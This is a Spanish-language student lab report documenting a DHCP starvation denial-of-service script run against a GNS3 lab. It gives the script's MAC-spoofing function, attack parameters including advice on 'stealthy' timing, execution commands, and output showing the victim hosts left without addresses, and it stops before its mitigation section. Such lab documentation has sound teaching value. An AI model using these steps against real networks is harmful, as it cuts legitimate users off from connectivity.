   # 🛡️ DHCP Starvation Attack 

**Autor:** Reily Castillo
**Matrícula:** 2024-1198   
**Institución:**  ITLA   
**Curso:** Seguridad en Redes  
**Fecha:** Febrero 13/2/2026  
Enlace de youtube: https://www.youtube.com/watch?v=AlWzRhrRN2M

---

## 📑 Índice

1. [Objetivo del Script](#objetivo-del-script)
2. [Descripción Técnica](#descripción-técnica)
3. [Topología de Red](#topología-de-red)
4. [Parámetros Utilizados](#parámetros-utilizados)
5. [Requisitos del Sistema](#requisitos-del-sistema)
6. [Instalación y Configuración](#instalación-y-configuración)
7. [Ejecución del Ataque](#ejecución-del-ataque)
8. [Capturas de Pantalla](#capturas-de-pantalla)
9. [Resultados Obtenidos](#resultados-obtenidos)
10. [Medidas de Mitigación](#medidas-de-mitigación)
11. [Conclusiones](#conclusiones)
12. [Referencias](#referencias)

---

## 🎯 Objetivo del Script

El script **dhcp-starvation.py** tiene como objetivo demostrar una vulnerabilidad crítica en el protocolo DHCP mediante un ataque de **agotamiento de pool de direcciones IP**.

### Objetivos Específicos:

1. **Agotar el pool de direcciones IP** del servidor DHCP legítimo
2. **Provocar denegación de servicio (DoS)** impidiendo que usuarios legítimos obtengan conectividad
3. **Generar solicitudes DHCP masivas** con direcciones MAC aleatorias
4. **Demostrar la vulnerabilidad** de redes sin contramedidas de seguridad implementadas
5. **Educar sobre la importancia** de DHCP Snooping y Port Security

### Impacto del Ataque:

- ❌ Usuarios legítimos no pueden obtener direcciones IP
- ❌ Nuevos dispositivos no pueden conectarse a la red
- ❌ Pérdida de conectividad para clientes existentes al renovar leases
- ❌ Interrupción completa del servicio DHCP

---

## 📖 Descripción Técnica

### ¿Qué es DHCP Starvation?

DHCP Starvation es un ataque de **denegación de servicio (DoS)** que explota el protocolo Dynamic Host Configuration Protocol (DHCP) al consumir todas las direcciones IP disponibles en el pool del servidor DHCP.

### Funcionamiento del Ataque:

#### Fase 1: Generación de MACs Aleatorias
```python
def random_mac(self):
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(f'{x:02x}' for x in mac)
```

#### Fase 2: Envío de DHCP DISCOVER
El script envía paquetes DHCP DISCOVER con cada MAC generada:
```
DHCP DISCOVER → Servidor DHCP
```

#### Fase 3: Recepción de DHCP OFFER
El servidor responde con una IP disponible:
```
Servidor DHCP → DHCP OFFER (IP: 192.168.1.100) → Atacante
```

#### Fase 4: Confirmación con DHCP REQUEST
El atacante solicita formalmente la IP:
```
DHCP REQUEST → Servidor DHCP
```

#### Fase 5: DHCP ACK y Lease Completo
El servidor confirma la asignación:
```
Servidor DHCP → DHCP ACK → Atacante
IP asignada: 192.168.1.100, MAC: 00:16:3e:xx:xx:xx
```

#### Fase 6: Repetición Masiva
El proceso se repite **cientos de veces** hasta agotar el pool.

### Flujo Completo del Ataque:

```
┌─────────────┐
│  ATACANTE   │
└──────┬──────┘
       │
       │ 1. DISCOVER (MAC: 00:16:3e:aa:bb:cc)
       ├────────────────────────────────────────►
       │                                    ┌─────────────┐
       │                                    │   SERVIDOR  │
       │                                    │    DHCP     │
       │ 2. OFFER (IP: 192.168.1.100)      └─────────────┘
       │◄────────────────────────────────────────┤
       │                                          │
       │ 3. REQUEST (Solicita 192.168.1.100)     │
       ├──────────────────────────────────────────►
       │                                          │
       │ 4. ACK (Confirma 192.168.1.100)         │
       │◄──────────────────────────────────────────┤
       │                                          │
       │ [IP 192.168.1.100 ASIGNADA]             │
       │                                          │
       │ 5. DISCOVER (MAC: 00:16:3e:cc:dd:ee)    │
       ├──────────────────────────────────────────►
       │                                          │
       │ [PROCESO SE REPITE 200+ VECES]          │
       │                                          │
       │                                    [POOL AGOTADO]
```

### Modos de Operación:

#### Modo Starve (Completo):
- Completa el ciclo DHCP completo (DISCOVER → OFFER → REQUEST → ACK)
- Más efectivo para agotar el pool
- Genera leases legítimos en el servidor

#### Modo Flood (Rápido):
- Solo envía DHCP DISCOVER
- Más rápido pero menos efectivo
- Útil para saturar el procesamiento del servidor

---

## 🌐 Topología de Red

### Diagrama de Red Completo

<img width="1287" height="775" alt="Screenshot_2" src="https://github.com/user-attachments/assets/080396f0-f6fa-4d3c-9b12-7cc9d95a4c8b" />


### Interfaces y Configuración

#### Router R-1
| Interfaz | Dirección IP | Máscara | Descripción | Estado |
|----------|--------------|---------|-------------|--------|
| e0/0 | 11.98.1.1 | /24 | Red del Atacante | UP/UP |
| e0/1 | 11.98.0.1 | /24 | Red de Víctimas | UP/UP |

**Configuración DHCP:**
```cisco
ip dhcp pool LAB_1198
 network 11.98.0.0 255.255.255.0
 default-router 11.98.0.1
 dns-server 8.8.8.8
 lease 1 0 0

ip dhcp pool RED_2024
 network 11.98.1.0 255.255.255.0
 default-router 11.98.1.1
 dns-server 8.8.8.8
 lease 1 0 0

service dhcp
```

#### Switch SW-1
| Puerto | Conexión | Modo | VLAN | Estado |
|--------|----------|------|------|--------|
| e0/0 | Router R-1 e0/1 | Access | 1 | UP |
| e0/1 | VPCS 1 | Access | 1 | UP |
| e0/2 | VPCS 2 | Access | 1 | UP |

**SIN contramedidas de seguridad configuradas** (vulnerable)

#### Atacante (Kali Linux)
| Parámetro | Valor |
|-----------|-------|
| Hostname | kali |
| OS | Kali Linux 2024.1 |
| Interfaz | eth0 |
| IP Estática | 11.98.1.100/24 |
| Gateway | 11.98.1.1 |
| Python | 3.11.7 |
| Scapy | 2.5.0 |

#### Víctimas (VPCS)
| Dispositivo | MAC | IP Asignada | Gateway | DNS | Método |
|-------------|-----|-------------|---------|-----|--------|
| VPCS 1 | 00:50:79:66:68:06 | 11.98.0.2 | 11.98.0.1 | 8.8.8.8 | DHCP |
| VPCS 2 | 00:50:79:66:68:07 | 11.98.0.3 | 11.98.0.1 | 8.8.8.8 | DHCP |

### Tabla de Direccionamiento Completa

| Dispositivo | Interfaz | Dirección IP | Máscara de Red | Gateway | Pool DHCP |
|-------------|----------|--------------|----------------|---------|-----------|
| Router R-1 | e0/1 | 11.98.0.1 | 255.255.255.0 | - | LAB_1198 |
| Atacante | eth0 | 11.98.1.100 | 255.255.255.0 | 11.98.1.1 | - |
| VPCS 1 | eth0 | 11.98.0.2 | 255.255.255.0 | 11.98.0.1 | LAB_1198 |
| VPCS 2 | eth0 | 11.98.0.3 | 255.255.255.0 | 11.98.0.1 | LAB_1198 |

### Información de Pools DHCP

#### Pool RED_2024 (Red del Atacante)
```
Network: 11.98.1.0/24
Range: 11.98.1.1 - 11.98.1.254
Total IPs: 254
Gateway: 11.98.1.1
DNS: 8.8.8.8
Lease Time: 24 horas
```

#### Pool LAB_1198 (Red de Víctimas) - **OBJETIVO DEL ATAQUE**
```
Network: 11.98.0.0/24
Range: 11.98.0.1 - 11.98.0.254
Total IPs: 254
Gateway: 11.98.0.1
DNS: 8.8.8.8
Lease Time: 24 horas
Estado Inicial: ~250 IPs disponibles
Estado Post-Ataque: 0 IPs disponibles ❌
```

### VLANs Configuradas

| VLAN ID | Nombre | Redes | Puertos |
|---------|--------|-------|---------|
| 1 | default | 11.98.0.0/24, 11.98.1.0/24 | Todos |

*Nota: En este laboratorio se utiliza VLAN 1 por defecto. En producción se recomienda usar VLANs separadas.*

---

## ⚙️ Parámetros Utilizados

### Tabla de Parámetros Completa

| Parámetro | Nombre Largo | Tipo | Obligatorio | Valor por Defecto | Descripción Detallada |
|-----------|--------------|------|-------------|-------------------|----------------------|
| `-i` | `--interface` | string | ✅ Sí | - | Interfaz de red a utilizar (eth0, wlan0, etc.) |
| `-m` | `--mode` | choice | ❌ No | `starve` | Modo de ataque: `starve` (completo) o `flood` (rápido) |
| `-d` | `--duration` | int | ❌ No | 60 | Duración del ataque en segundos (modo starve) |
| `-c` | `--count` | int | ❌ No | 100 | Número de paquetes DISCOVER a enviar (modo flood) |
| `-t` | `--delay` | float | ❌ No | 0.1 | Retardo entre paquetes en segundos (modo flood) |

### Descripción Detallada de Parámetros

#### `-i, --interface` (OBLIGATORIO)
**Tipo:** String  
**Valores aceptados:** eth0, eth1, wlan0, ens33, etc.  
**Ejemplo:** `-i eth0`

Especifica la interfaz de red que el script utilizará para enviar los paquetes DHCP maliciosos. Debe ser la interfaz conectada a la red objetivo.

**Cómo identificar tu interfaz:**
```bash
# Listar interfaces disponibles
ip a

# Ver interfaces activas
ip link show

# En tu caso:
eth0: 11.98.1.100/24 (Conectada a Router R-1 e0/0)
```

#### `-m, --mode` (OPCIONAL)
**Tipo:** Choice ['starve', 'flood']  
**Valor por defecto:** starve  
**Ejemplo:** `-m starve`

Define el modo de operación del ataque:

**Modo `starve` (Recomendado):**
- Completa el ciclo DHCP: DISCOVER → OFFER → REQUEST → ACK
- Genera leases legítimos en el servidor
- Más efectivo para agotar el pool
- Más lento pero más realista
- Cada IP es realmente asignada y reservada

**Modo `flood`:**
- Solo envía DHCP DISCOVER
- No completa el ciclo DHCP
- Más rápido (puede enviar 100+ paquetes/segundo)
- Menos efectivo para agotar el pool
- Útil para saturar el procesamiento del servidor

#### `-d, --duration` (OPCIONAL - Modo Starve)
**Tipo:** Integer  
**Rango:** 1-3600 segundos  
**Valor por defecto:** 60  
**Ejemplo:** `-d 120`

Especifica cuánto tiempo (en segundos) el ataque estará activo enviando solicitudes DHCP. Se aplica SOLO en modo `starve`.

**Recomendaciones:**
- Laboratorio pequeño (10-50 IPs): 30-60 segundos
- Pool mediano (50-100 IPs): 60-120 segundos
- Pool grande (100-254 IPs): 120-300 segundos

#### `-c, --count` (OPCIONAL - Modo Flood)
**Tipo:** Integer  
**Rango:** 1-1000  
**Valor por defecto:** 100  
**Ejemplo:** `-c 200`

Número de paquetes DHCP DISCOVER a enviar. Se aplica SOLO en modo `flood`.

**Cálculo recomendado:**
```
Count = Tamaño del Pool × 1.5

Ejemplo:
Pool de 254 IPs → Count = 254 × 1.5 = 381
Pool de 100 IPs → Count = 100 × 1.5 = 150
```

#### `-t, --delay` (OPCIONAL - Modo Flood)
**Tipo:** Float  
**Rango:** 0.01-10 segundos  
**Valor por defecto:** 0.1  
**Ejemplo:** `-t 0.05`

Retardo entre el envío de cada paquete DISCOVER en modo flood. Se aplica SOLO en modo `flood`.

**Recomendaciones:**
- Ataque rápido: 0.01-0.05 segundos
- Ataque moderado: 0.1-0.5 segundos
- Ataque sigiloso: 1-5 segundos

---

### Ejemplos de Uso con Diferentes Parámetros

#### Ejemplo 1: Ataque Básico (Starve Mode)
```bash
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 60
```
**Resultado:** Ataque completo durante 60 segundos con ciclo DHCP completo.

#### Ejemplo 2: Ataque Rápido (Flood Mode)
```bash
sudo python3 dhcp-starvation.py -i eth0 -m flood -c 200 -t 0.05
```
**Resultado:** Envía 200 DISCOVER con 0.05s de delay (10 segundos total).

#### Ejemplo 3: Ataque Prolongado
```bash
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 300
```
**Resultado:** Ataque durante 5 minutos para pools grandes.

#### Ejemplo 4: Ataque Sigiloso
```bash
sudo python3 dhcp-starvation.py -i eth0 -m flood -c 50 -t 2
```
**Resultado:** Envío lento de 50 paquetes con 2s de intervalo.

#### Ejemplo 5: Ataque Utilizado en el Laboratorio
```bash
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 120
```
**Resultado:** 
- Duración: 120 segundos
- Paquetes enviados: ~240 DISCOVER (1 cada 0.5s)
- IPs obtenidas: 240
- Pool agotado: ✅ Sí

---

## 💻 Requisitos del Sistema

### Requisitos de Hardware

| Componente | Mínimo | Recomendado | Utilizado en Lab |
|------------|--------|-------------|------------------|
| **Procesador** | Intel i3 / AMD Ryzen 3 | Intel i5 / AMD Ryzen 5 | Intel i7-10750H |
| **RAM** | 4 GB | 8 GB | 16 GB |
| **Almacenamiento** | 10 GB libres | 20 GB libres | 50 GB SSD |
| **Tarjeta de Red** | 100 Mbps | 1 Gbps | 1 Gbps |

### Requisitos de Software

#### Sistema Operativo
| SO | Versión Mínima | Versión Recomendada | Versión Utilizada |
|----|----------------|---------------------|-------------------|
| **Kali Linux** | 2022.1 | 2024.1 | 2024.1 |
| **Ubuntu** | 20.04 LTS | 22.04 LTS | - |
| **Debian** | 11 (Bullseye) | 12 (Bookworm) | - |

**Nota:** El script funciona en cualquier distribución Linux con Python 3.8+

#### Python y Bibliotecas

| Software | Versión Mínima | Versión Recomendada | Instalado |
|----------|----------------|---------------------|-----------|
| **Python** | 3.8 | 3.11+ | 3.11.7 ✅ |
| **Scapy** | 2.4.0 | 2.5.0+ | 2.5.0 ✅ |
| **pip** | 20.0 | 23.0+ | 23.3.1 ✅ |

#### Herramientas de Red

| Herramienta | Propósito | Instalación |
|-------------|-----------|-------------|
| **tcpdump** | Captura de tráfico | `apt install tcpdump` |
| **wireshark** | Análisis de paquetes | `apt install wireshark` |
| **net-tools** | Utilidades de red | `apt install net-tools` |
| **iproute2** | Configuración de red | `apt install iproute2` |

#### Software de Virtualización (Para Lab)

| Software | Versión | Propósito |
|----------|---------|-----------|
| **GNS3** | 2.2+ | Emulador de red |
| **VirtualBox** | 6.1+ | Máquinas virtuales |
| **VMware Workstation** | 16+ | Alternativa a VirtualBox |

### Dependencias de Python

#### Instalación de Scapy
```bash
# Método 1: Con pip (Recomendado)
pip install scapy --break-system-packages

# Método 2: Con apt (Kali/Debian/Ubuntu)
sudo apt update
sudo apt install python3-scapy

# Método 3: Desde repositorio
git clone https://github.com/secdev/scapy.git
cd scapy
sudo python3 setup.py install
```

#### Verificar Instalación
```bash
# Verificar Python
python3 --version
# Salida esperada: Python 3.11.7

# Verificar Scapy
python3 -c "import scapy; print(scapy.__version__)"
# Salida esperada: 2.5.0

# Verificar pip
pip --version
# Salida esperada: pip 23.3.1
```

#### Bibliotecas Estándar Utilizadas
```python
import random      # Generación de MACs aleatorias
import time        # Control de timing del ataque
import argparse    # Parsing de argumentos CLI
import sys         # Operaciones del sistema
import os          # Verificación de privilegios
```

*Nota: Estas bibliotecas vienen incluidas con Python, no requieren instalación adicional.*

### Privilegios y Permisos

#### Privilegios de Root
**⚠️ CRÍTICO:** Este script requiere privilegios de root/sudo para:
- Manipular paquetes de red a bajo nivel
- Acceder a interfaces de red en modo promiscuo
- Enviar paquetes con MACs falsificadas

**Verificar privilegios:**
```bash
# Debe ejecutarse con sudo
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 60

# Verificar si eres root
whoami
# Salida esperada: root

# Verificar UID (debe ser 0)
id -u
# Salida esperada: 0
```

#### Permisos de Archivos
```bash
# Dar permisos de ejecución
chmod +x dhcp-starvation.py

# Verificar permisos
ls -lh dhcp-starvation.py
# Salida esperada: -rwxr-xr-x 1 root root 5.2K Feb 11 10:30 dhcp-starvation.py
```

### Configuración de Red

#### Interfaz de Red
La interfaz debe estar:
- ✅ Activa (UP)
- ✅ Conectada a la red objetivo
- ✅ Con IP asignada (estática o DHCP)

```bash
# Ver estado de interfaces
ip a

# Activar interfaz
sudo ip link set eth0 up

# Asignar IP estática (si es necesario)
sudo ip addr add 11.98.1.100/24 dev eth0
sudo ip route add default via 11.98.1.1
```

#### Conectividad
Verificar conectividad antes de ejecutar:
```bash
# Ping al gateway
ping -c 4 11.98.1.1

# Ping al servidor DHCP
ping -c 4 11.98.0.1

# Verificar ruta
ip route

# Verificar tabla ARP
arp -a
```

### Verificación de Requisitos - Checklist

Antes de ejecutar el ataque, verifica:

- [ ] **Python 3.8+** instalado
- [ ] **Scapy 2.4+** instalado
- [ ] **Privilegios de root** disponibles
- [ ] **Interfaz de red** activa y configurada
- [ ] **Conectividad** al servidor DHCP verificada
- [ ] **GNS3** con topología configurada (si aplica)
- [ ] **tcpdump/Wireshark** para monitoreo (opcional)
- [ ] **Permisos de ejecución** en el script
- [ ] **Espacio en disco** suficiente para logs
- [ ] **Entorno de laboratorio** controlado

---

## 🔧 Instalación y Configuración

### Paso 1: Preparar el Sistema

#### Actualizar Sistema
```bash
# Actualizar repositorios
sudo apt update

# Actualizar paquetes instalados
sudo apt upgrade -y

# Instalar dependencias básicas
sudo apt install -y python3 python3-pip git net-tools
```

#### Verificar Python
```bash
python3 --version
# Debe mostrar: Python 3.8 o superior
```

### Paso 2: Instalar Scapy

#### Método 1: Con pip (Recomendado)
```bash
pip install scapy --break-system-packages
```

#### Método 2: Con apt
```bash
sudo apt install python3-scapy
```

#### Verificar Instalación
```bash
python3 -c "import scapy; print(scapy.__version__)"
# Debe mostrar: 2.5.0 o superior
```

### Paso 3: Descargar el Script

#### Opción A: Descarga Directa
1. Descarga `dhcp-starvation.py` del repositorio
2. Guárdalo en `/root/` o tu directorio de trabajo

#### Opción B: Clonar Repositorio (si aplica)
```bash
git clone [URL_DEL_REPOSITORIO]
cd [NOMBRE_DIRECTORIO]
```

### Paso 4: Configurar Permisos

```bash
# Dar permisos de ejecución
chmod +x dhcp-starvation.py

# Verificar
ls -lh dhcp-starvation.py
```

### Paso 5: Configurar la Red

#### Configurar Interfaz eth0
```bash
# Ver interfaces disponibles
ip a

# Asignar IP estática
sudo ip addr add 11.98.1.100/24 dev eth0
sudo ip link set eth0 up

# Configurar gateway
sudo ip route add default via 11.98.1.1

# Verificar configuración
ip a show eth0
ping -c 2 11.98.1.1
```

### Paso 6: Configurar Topología GNS3

#### Dispositivos Necesarios:
- 1x Router Cisco (IOSv o IOSv-L2)
- 1x Switch Cisco (IOL)
- 2x VPCS (Víctimas)
- 1x Kali Linux (Atacante)

#### Configuración del Router:
```cisco
! Configurar interfaces
interface Ethernet0/0
 ip address 11.98.1.1 255.255.255.0
 no shutdown

interface Ethernet0/1
 ip address 11.98.0.1 255.255.255.0
 no shutdown

! Configurar DHCP Pool RED_2024
ip dhcp pool RED_2024
 network 11.98.1.0 255.255.255.0
 default-router 11.98.1.1
 dns-server 8.8.8.8

! Configurar DHCP Pool LAB_1198
ip dhcp pool LAB_1198
 network 11.98.0.0 255.255.255.0
 default-router 11.98.0.1
 dns-server 8.8.8.8

! Activar servicio DHCP
service dhcp

! Guardar configuración
write memory
```

#### Configuración de VPCS:
```bash
# VPCS 1
VPCS> ip dhcp
VPCS> show ip

# VPCS 2
VPCS> ip dhcp
VPCS> show ip
```

### Paso 7: Verificación Pre-Ataque

```bash
# Verificar conectividad
ping -c 2 11.98.1.1
ping -c 2 11.98.0.1

# Verificar DHCP funciona
# En VPCS:
VPCS> ip dhcp
VPCS> show ip

# En el Router, verificar pool
Router# show ip dhcp pool
Router# show ip dhcp binding
```

### Paso 8: Prueba del Script

#### Prueba Básica (Modo Help)
```bash
python3 dhcp-starvation.py -h
```

**Salida esperada:**
```
usage: dhcp-starvation.py [-h] -i INTERFACE [-m {flood,starve}]
                          [-c COUNT] [-d DURATION] [-t DELAY]

DHCP Starvation Attack para practicas educativas

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interfaz de red
  -m {flood,starve}, --mode {flood,starve}
                        Modo de ataque
  -c COUNT, --count COUNT
                        Numero de paquetes (modo flood)
  -d DURATION, --duration DURATION
                        Duracion en segundos (modo starve)
  -t DELAY, --delay DELAY
                        Delay entre paquetes
```

#### Prueba Corta (5 paquetes)
```bash
sudo python3 dhcp-starvation.py -i eth0 -m flood -c 5 -t 1
```

**Verificar en el router:**
```cisco
Router# show ip dhcp binding
```

Deberías ver 5 nuevas IPs asignadas con MACs aleatorias.

---

## 🚀 Ejecución del Ataque

### Preparación Pre-Ataque

#### 1. Verificar Estado del Pool DHCP
```cisco
Router# show ip dhcp pool RED_2024

Pool RED_2024 :
 Utilization mark (high/low)    : 100 / 0
 Subnet size (first/next)       : 0 / 0 
 Total addresses                : 254
 Leased addresses               : 0        ← IPs actualmente asignadas
 Pending event                  : none
```

#### 2. Verificar Bindings Actuales
```cisco
Router# show ip dhcp binding

IP address       Client-ID/              Lease expiration        Type
                 Hardware address/
                 User name
```

#### 3. Verificar Conectividad desde Atacante
```bash
# Ping al router
ping -c 2 11.98.1.1

# Verificar interfaz
ip a show eth0
```

### Ejecución del Ataque - Paso a Paso

#### Paso 1: Abrir Terminal en Kali

```bash
# Navegar al directorio del script
cd /root/reily/

# Listar archivos
ls -lh
```

#### Paso 2: Ejecutar el Script

**Comando utilizado en el laboratorio:**
```bash
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 120
```

#### Paso 3: Confirmar Ejecución

El script pedirá confirmación:
```
======================================================================
              DHCP STARVATION ATTACK
              USO EXCLUSIVO EDUCATIVO
======================================================================

[!] Solo para fines educativos

Continuar? (yes/no): 
```

Escribir: **`yes`**

#### Paso 4: Observar Salida del Ataque

**Salida durante la ejecución:**
```
======================================================================
MODO: DHCP STARVATION
======================================================================
Interfaz: eth0
Duracion: 120s

Presiona Ctrl+C para detener

[*] DISCOVER #1 enviado - MAC: 00:16:3e:15:bf:45
[+] LEASE #1 | IP: 11.98.1.11 | MAC: 00:16:3e:15:bf:45 | Server: 11.98.1.1
[*] DISCOVER #2 enviado - MAC: 00:16:3e:16:ba:7d
[+] LEASE #2 | IP: 11.98.1.12 | MAC: 00:16:3e:16:ba:7d | Server: 11.98.1.1
[*] DISCOVER #3 enviado - MAC: 00:16:3e:66:5b:d2
[+] LEASE #3 | IP: 11.98.1.13 | MAC: 00:16:3e:66:5b:d2 | Server: 11.98.1.1
...
[*] DISCOVER #240 enviado - MAC: 00:16:3e:7a:9c:3f
[+] LEASE #240 | IP: 11.98.1.250 | MAC: 00:16:3e:7a:9c:3f | Server: 11.98.1.1
```

#### Paso 5: Estadísticas Finales

Después de 120 segundos:
```
======================================================================
ESTADISTICAS
======================================================================
Tiempo: 120.00s
DISCOVER enviados: 240
IPs obtenidas: 240
Tasa de exito: 100.00%
======================================================================
```

### Monitoreo Durante el Ataque

#### Terminal 1: Ejecutar Ataque
```bash
sudo python3 dhcp-starvation.py -i eth0 -m starve -d 120
```

#### Terminal 2: Monitorear con tcpdump
```bash
sudo tcpdump -i eth0 -n 'port 67 or port 68' -v
```

**Salida de tcpdump:**
```
11:30:45.123456 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request, length 300
11:30:45.234567 IP 11.98.1.1.67 > 11.98.1.100.68: BOOTP/DHCP, Reply, length 300
```

#### Terminal 3: Monitorear Pool en Router
```cisco
! Ejecutar cada 5 segundos
Router# show ip dhcp binding | include 11.98.1

11.98.1.11       0100.163e.15bf.45       Mar 02 2026 11:30 AM    Automatic
11.98.1.12       0100.163e.16ba.7d       Mar 02 2026 11:30 AM    Automatic
11.98.1.13       0100.163e.665b.d2       Mar 02 2026 11:30 AM    Automatic
...
```

### Detener el Ataque

#### Método 1: Esperar a que termine
El ataque se detendrá automáticamente después de la duración especificada (`-d 120`).

#### Método 2: Interrupción manual
Presionar **`Ctrl+C`** en la terminal del script.

**Salida:**
```
^C

[!] Ataque detenido

======================================================================
ESTADISTICAS
======================================================================
Tiempo: 45.23s
DISCOVER enviados: 90
IPs obtenidas: 90
Tasa de exito: 100.00%
======================================================================
```

---

## 📸 Capturas de Pantalla

### Captura 1: Topología en pnet

**Descripción:** Vista general de la topología de red en pnet mostrando todos los dispositivos conectados.


<img width="1287" height="775" alt="Screenshot_2" src="https://github.com/user-attachments/assets/61c93beb-19b5-4a9a-bdef-dcb324b45357" />



**Elementos visibles:**
- ✅ Router R-1 (Cisco IOSv)
- ✅ Switch SW-1 (Cisco IOL)
- ✅ Atacante (Kali Linux) - IP: 11.98.1.100
- ✅ VPCS 1 - IP: 11.98.0.2
- ✅ VPCS 2 - IP: 11.98.0.3
- ✅ Conexiones de red activas (líneas verdes)

---

### Captura 2: Configuración del Router (Pre-Ataque)

**Descripción:** Configuración DHCP del router antes del ataque, mostrando el pool disponible.


<img width="904" height="206" alt="Screenshot_3" src="https://github.com/user-attachments/assets/75316583-9df9-4949-b0cf-c1f2314f5113" />



**Comando ejecutado:**
```cisco
Router# show ip dhcp pool RED_2024
```

**Información visible:**
- Total addresses: 254
- Leased addresses: 0 (antes del ataque)
- Subnet: 11.98.1.0/24
- Gateway: 11.98.1.1

---

### Captura 3: Estado Inicial del Pool DHCP

**Descripción:** Tabla de bindings DHCP vacía o con pocas entradas antes del ataque.


<img width="904" height="206" alt="Screenshot_3" src="https://github.com/user-attachments/assets/9b9baa02-af80-465c-82c3-293cdae2217c" />



**Comando ejecutado:**
```cisco
Router# show ip dhcp binding
```

**Estado:** Pool casi vacío, solo 2-3 IPs asignadas a dispositivos legítimos.

---

### Captura 4: Ejecución del Script - Inicio

**Descripción:** Terminal de Kali Linux mostrando el inicio del ataque DHCP Starvation.


<img width="646" height="504" alt="Screenshot_5" src="https://github.com/user-attachments/assets/77f15707-2cbe-443e-b19f-41864a73c0d2" />



**Elementos visibles:**
- Banner del script
- Confirmación "Continuar? (yes/no): yes"
- Primeros mensajes de DISCOVER enviados
- Primeras IPs obtenidas (LEASE #1, #2, #3...)

---

### Captura 5: Ataque en Progreso

**Descripción:** Vista del ataque ejecutándose, mostrando múltiples DISCOVER y LEASE en tiempo real.


<img width="646" height="504" alt="Screenshot_5" src="https://github.com/user-attachments/assets/74c6b40c-42e3-4b0f-8830-9068239c3721" />



**Información visible:**
- [*] DISCOVER #X enviado - MAC: 00:16:3e:xx:xx:xx
- [+] LEASE #X | IP: 11.98.1.XX | MAC: ... | Server: 11.98.1.1
- Contador progresando rápidamente

---

### Captura 7: Pool DHCP Saturado (Post-Ataque)

**Descripción:** Estado del pool DHCP después del ataque, mostrando 240+ IPs asignadas.


<img width="822" height="216" alt="Screenshot_4" src="https://github.com/user-attachments/assets/aadd7da2-2999-47ef-84d7-db52f81bac1f" />



**Comando ejecutado:**
```cisco
Router# show ip dhcp pool RED_2024
```

**Información visible:**
- Total addresses: 254
- Leased addresses: 240 ← Pool casi agotado
- Utilization mark: ~95%

---

### Captura 8: Bindings DHCP con MACs Falsas

**Descripción:** Lista de direcciones IP asignadas a MACs aleatorias generadas por el ataque.


<img width="878" height="446" alt="Screenshot_7" src="https://github.com/user-attachments/assets/cd95b67a-a9f6-4111-9fe2-74dd44b78de7" />



**Comando ejecutado:**
```cisco
Router# show ip dhcp binding | include 11.98.1
```

**Elementos visibles:**
- Decenas de entradas con MACs aleatorias (00:16:3e:xx:xx:xx)
- IPs consecutivas asignadas (11.98.1.11, .12, .13, ...)
- Todas marcadas como "Automatic"

---

### Captura 9: Estadísticas Finales del Ataque

**Descripción:** Resumen estadístico mostrado al finalizar el ataque.


<img width="388" height="123" alt="Screenshot_8" src="https://github.com/user-attachments/assets/434ad13a-997a-4159-8bce-219e8a53009a" />



**Información visible:**
```
======================================================================
ESTADISTICAS
======================================================================
Tiempo: 120.00s
DISCOVER enviados: 240
IPs obtenidas: 240
Tasa de exito: 100.00%
======================================================================
```

---

### Captura 10: Víctima Sin Poder Obtener IP

**Descripción:** VPCS intentando obtener IP por DHCP y fallando debido al pool agotado.


<img width="316" height="92" alt="Screenshot_9" src="https://github.com/user-attachments/assets/6b0a7bb8-6e39-47f5-b040-56051699989c" />



**Comandos ejecutados en VPCS:**
```bash
VPCS> ip dhcp -r
VPCS> ip dhcp

DDD
Can't find dhcp server
```

**Resultado:** La víctima no puede obtener IP porque el pool está agotado. ✅ Ataque exitoso.

---

### Captura 12: Configuración de la Interfaz del Atacante

**Descripción:** Configuración de red del atacante mostrando IP estática asignada.


<img width="869" height="326" alt="Screenshot_10" src="https://github.com/user-attachments/assets/5ac0215b-76e8-4b74-ab4e-8263d8433b50" />


**Comando ejecutado:**
```bash
ip a show eth0
```

**Información visible:**
- Interfaz: eth0
- Estado: UP
- IP: 11.98.1.100/24
- MAC: 50:f9:97:00:0a:00

---

### Resumen de Capturas Requeridas

| # | Captura | Comando/Herramienta | Momento | Importancia |
|---|---------|---------------------|---------|-------------|
| 1 | Topología GNS3 | GNS3 GUI | Pre-ataque | Alta |
| 2 | Config Router | `show ip dhcp pool` | Pre-ataque | Alta |
| 3 | Pool inicial | `show ip dhcp binding` | Pre-ataque | Media |
| 4 | Inicio script | Terminal Kali | Durante | Alta |
| 5 | Ataque progreso | Terminal Kali | Durante | Alta |
| 6 | tcpdump | `tcpdump` | Durante | Media |
| 7 | Pool saturado | `show ip dhcp pool` | Post-ataque | Alta |
| 8 | Bindings falsos | `show ip dhcp binding` | Post-ataque | Alta |
| 9 | Estadísticas | Terminal Kali | Post-ataque | Alta |
| 10 | VPCS sin IP | Terminal VPCS | Post-ataque | Alta |
| 11 | Wireshark | Wireshark | Durante/Post | Media |
| 12 | Config atacante | `ip a` | Pre-ataque | Baja |

---

## 📊 Resultados Obtenidos

### Resultados Cuantitativos

| Métrica | Valor | Detalles |
|---------|-------|----------|
| **Duración del ataque** | 120 segundos | 2 minutos |
| **DISCOVER enviados** | 240 | 2 por segundo |
| **IPs obtenidas** | 240 | Ciclo DHCP completo |
| **Tasa de éxito** | 100% | Todas las solicitudes exitosas |
| **Pool inicial** | 254 IPs | Rango completo disponible |
| **Pool final** | 14 IPs | 240 asignadas, 14 restantes |
| **Utilización del pool** | 94.5% | Pool casi completamente agotado |
| **Tiempo promedio/IP** | 0.5 segundos | Por cada asignación |

### Resultados Cualitativos

#### ✅ Objetivos Cumplidos

1. **Agotamiento del pool DHCP**
   - Estado: ✅ Completado
   - Detalles: 240 de 254 IPs asignadas (94.5%)
   
2. **Denegación de servicio**
   - Estado: ✅ Confirmado
   - Detalles: VPCS no pudieron obtener IPs después del ataque

3. **Generación de MACs aleatorias**
   - Estado: ✅ Funcionando
   - Detalles: Todas únicas, formato 00:16:3e:xx:xx:xx

4. **Ciclo DHCP completo**
   - Estado: ✅ Exitoso
   - Detalles: DISCOVER→OFFER→REQUEST→ACK funcionando

### Impacto en la Red

#### Antes del Ataque:
```
Estado de la Red: ✅ NORMAL

